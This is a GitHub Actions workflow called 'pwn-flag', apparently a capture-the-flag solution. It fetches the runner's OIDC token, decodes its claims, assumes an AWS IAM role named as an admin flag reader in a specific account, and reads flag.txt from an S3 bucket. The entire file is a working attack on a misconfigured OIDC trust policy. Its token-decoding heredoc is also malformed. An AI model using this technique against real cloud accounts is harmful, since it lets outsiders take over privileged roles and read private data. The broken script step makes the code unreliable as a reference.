name: pwn-flag
on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  grab:
    runs-on: ubuntu-latest

    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Debug OIDC claims (optional, shows repo/sub)
        env:
          ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
          ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
        run: |
          set -e
          echo "Requesting OIDC token..."
          RESP=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                 "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          TOK=$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "Decoded JWT claims (sub + aud + repo info):"
          # print claims
          python3 - <<'PY'
import sys, base64, json
tok = sys.stdin.read().strip()
claims = json.loads(base64.b64decode(tok.split('.')[1] + '=' * (-len(tok.split('.')[1])%4)))
print(json.dumps(claims, indent=2))
PY <<<"$TOK"
          echo "----"

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875
          role-session-name: oops-we-did-it
          aws-region: ap-southeast-1

      - name: Read flag
        run: |
          echo "Caller identity:"
          aws sts get-caller-identity || true
          echo "Try reading the flag:"
          aws s3 cp s3://oh-i-really-do-care/flag.txt - || true
